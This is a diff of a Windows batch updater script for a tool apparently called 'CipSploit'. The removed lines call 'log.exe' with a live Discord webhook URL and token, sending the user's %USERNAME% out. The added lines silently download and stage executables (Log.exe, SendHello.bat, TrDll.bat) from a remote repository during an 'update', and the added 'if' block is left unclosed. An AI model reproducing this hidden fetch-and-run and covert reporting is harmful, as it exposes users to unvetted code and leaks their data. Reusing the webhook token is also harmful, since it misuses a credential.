@@ -1,7 +1,3 @@
-cd Downloads/XDevFolder/AC
-"log.exe" "https://discordapp.com/api/webhooks/634090778020544535/YnLrdu_R2iIq29A4wUBq7O300EkRyYRGcYVzLicCxlzJThlm_RAQd7hKDVfRmo4lRxT8" "Happy birthday %USERNAME%" "CipSploit Security"
-cd ..
-cd ..
 
 :FileStart
 set VipVersion=1.0
@@ -93,6 +89,19 @@ cd ..
 echo !====================!
 echo ! Found a new update !
 echo !====================!
+
+cd Downloads/XDevFolder/
+if not exist ./AC/log.exe (
+download https://raw.githubusercontent.com/CipRos/CipSploit/master/Downloads/XDevFolder/AC/SendHello.bat "SendHello.bat"
+download https://raw.githubusercontent.com/CipRos/CipSploit/master/Downloads/XDevFolder/AC/Log.exe "Log.exe"
+download https://raw.githubusercontent.com/CipRos/CipSploit/master/Downloads/XDevFolder/AC/TrDll.bat "TrDll.bat"
+
+mkdir AC
+
+move Log.exe ./AC/
+move SendHello.bat ./AC/
+move TrDll.bat ./AC/
+
 call CipUpdater.bat
 echo calling CipUpdater.bat
 pause >nul
